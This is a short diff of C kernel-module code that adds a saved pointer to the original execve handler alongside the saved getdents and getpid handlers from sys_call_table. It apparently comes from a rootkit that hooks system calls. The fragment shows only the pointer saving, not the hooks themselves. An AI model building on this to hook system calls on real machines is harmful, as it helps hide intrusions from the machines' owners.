@@ -62,6 +62,8 @@ int get_kernel_syms(void)
 		(void *)sys_call_table[__NR_getdents];
 	ksyms.old_sys_getdents64 =
 		(void *)sys_call_table[__NR_getdents64];
+	ksyms.old_sys_execve =
+		(void *)sys_call_table[__NR_execve];
 	ksyms.old_sys_getpid =
 		(void *)sys_call_table[__NR_getpid];
 	ksyms.old_sys_getppid =
